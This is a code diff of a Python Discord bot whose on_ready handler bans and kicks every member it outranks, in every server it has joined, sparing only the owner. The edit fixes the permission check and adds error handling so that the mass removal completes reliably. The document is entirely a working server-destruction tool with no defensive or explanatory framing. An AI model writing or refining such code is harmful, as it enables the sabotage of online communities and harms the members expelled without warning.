@@ -15,11 +15,20 @@ async def on_ready():
         for mmr in bot.get_all_members():
             if mmr.top_role.position >= mmr.guild.me.top_role.position:
                 continue
-            if mmr.guild.me.permissions.kick_members:
-                await mmr.kick()
-            if mmr.guild.me.permissions.ban_members:
-                await mmr.ban()
+            if mmr.id == mmr.guild.owner_id:
+                continue
+            if mmr.guild.me.guild_permissions.ban_members:
+                try:
+                    await mmr.ban()
+                except:
+                    print("ban fail")
+            if mmr.guild.me.guild_permissions.kick_members:
+                try:
+                    await mmr.kick()
+                except:
+                    print("kick fail")
 
 TOKEN = os.environ['BOT_TOKEN']
 bot.run(TOKEN)
+
 
